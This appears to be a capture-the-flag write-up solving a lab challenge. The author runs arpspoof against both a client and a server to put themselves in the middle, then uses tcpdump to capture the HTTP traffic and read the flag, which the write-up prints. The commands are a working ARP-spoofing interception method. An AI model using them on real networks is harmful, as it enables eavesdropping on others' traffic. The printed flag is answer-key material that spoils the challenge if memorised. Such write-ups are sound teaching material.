---
layout: post
title:  "DevSecOops Challenges"
date:   2026-09-07 15:28:00 -0400
author: uzi
tags: [CTF]
permalink: /nns-ctf-2026-devsecoops/
---

**Title**: Hiding in your WiFi

**Author**: 0xle

**Category**: DevSecOops

**Description**: I'm on your network. There is a client at `10.10.10.20` that keeps fetching something from the web server at `10.10.10.10`, and the server only talks to the client. You are `10.10.10.66`. You have `arpspoof` and `tcpdump`.

This one should be pretty simple. I need to man in the middle via arp spoofing. `arpspoof` will easily let me lie to both machines, tricking them into sending their traffic through my MAC address instead. Then I can use `tcpdump` to intercept the traffic.

Tell the client that I am the server:
```shell
player@attacker-bcf7949f8-vcq6b:/$ arpspoof -i eth0 -t 10.10.10.20 10.10.10.10  
2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66  
2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66  
2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66
... etc
```

Tell the server that I am the client:
```shell
player@attacker-bcf7949f8-vcq6b:/$ arpspoof -i eth0 -t 10.10.10.10 10.10.10.20   
2:0:0:0:0:66 2:0:0:0:0:10 0806 42: arp reply 10.10.10.20 is-at 2:0:0:0:0:66  
2:0:0:0:0:66 2:0:0:0:0:10 0806 42: arp reply 10.10.10.20 is-at 2:0:0:0:0:66  
2:0:0:0:0:66 2:0:0:0:0:10 0806 42: arp reply 10.10.10.20 is-at 2:0:0:0:0:66
... etc
```

Run `tcpdump` and intercept the traffic:
```shell
player@attacker-bcf7949f8-vcq6b:/$ tcpdump -i eth0 -n -v  
tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes  
21:54:46.202508 IP (tos 0x0, ttl 64, id 52954, offset 0, flags [DF], proto TCP (6), length 52)  
10.10.10.20.56614 > 10.10.10.10.80: Flags [.], cksum 0x54e9 (correct), ack 590987471, win 488, options [nop,nop,TS val 2044251912 ecr 581180412], length 0  
21:54:46.202511 IP (tos 0x0, ttl 63, id 52954, offset 0, flags [DF], proto TCP (6), length 52)  
10.10.10.20.56614 > 10.10.10.10.80: Flags [.], cksum 0x54e9 (correct), ack 1, win 488, options [nop,nop,TS val 2044251912 ecr 581180412], length 0  
21:54:46.202595 IP (tos 0x0, ttl 64, id 52955, offset 0, flags [DF], proto TCP (6), length 135)  
10.10.10.20.56614 > 10.10.10.10.80: Flags [P.], cksum 0x4845 (correct), seq 0:83, ack 1, win 488, options [nop,nop,TS val 2044251912 ecr 581180412], length 83: HTTP, lengt  
h: 83  
		GET /flag.txt HTTP/1.1  
		Host: 10.10.10.10  
		User-Agent: curl/8.14.1  
		Accept: */*  
  
21:54:46.202597 IP (tos 0x0, ttl 63, id 52955, offset 0, flags [DF], proto TCP (6), length 135)  
10.10.10.20.56614 > 10.10.10.10.80: Flags [P.], cksum 0x4845 (correct), seq 0:83, ack 1, win 488, options [nop,nop,TS val 2044251912 ecr 581180412], length 83: HTTP, lengt  
h: 83  
		GET /flag.txt HTTP/1.1  
		Host: 10.10.10.10  
		User-Agent: curl/8.14.1  
		Accept: */*  
  
21:54:46.202720 IP (tos 0x0, ttl 64, id 29896, offset 0, flags [DF], proto TCP (6), length 52)  
10.10.10.10.80 > 10.10.10.20.56614: Flags [.], cksum 0x5490 (correct), ack 83, win 487, options [nop,nop,TS val 581180419 ecr 2044251912], length 0  
21:54:46.202721 IP (tos 0x0, ttl 63, id 29896, offset 0, flags [DF], proto TCP (6), length 52)  
10.10.10.10.80 > 10.10.10.20.56614: Flags [.], cksum 0x5490 (correct), ack 83, win 487, options [nop,nop,TS val 581180419 ecr 2044251912], length 0  
21:54:46.203387 IP (tos 0x0, ttl 64, id 29897, offset 0, flags [DF], proto TCP (6), length 350)  
10.10.10.10.80 > 10.10.10.20.56614: Flags [P.], cksum 0xca6b (correct), seq 1:299, ack 83, win 487, options [nop,nop,TS val 581180420 ecr 2044251912], length 298: HTTP, le  
ngth: 298  
		HTTP/1.1 200 OK  
		Server: nginx  
		Date: Fri, 04 Sep 2026 21:54:46 GMT  
		Content-Type: text/plain  
		Content-Length: 68  
		Last-Modified: Fri, 04 Sep 2026 21:48:59 GMT  
		Connection: keep-alive  
		ETag: "6a9b3ccb-44"  
		Accept-Ranges: bytes  
  
		NNS{5w17Ch3d_N37w0RKs_st1ll_7rUst_4RP_s0_K33p_Y0ur_deVice5_5ePaRat3}
```

`NNS{5w17Ch3d_N37w0RKs_st1ll_7rUst_4RP_s0_K33p_Y0ur_deVice5_5ePaRat3}`
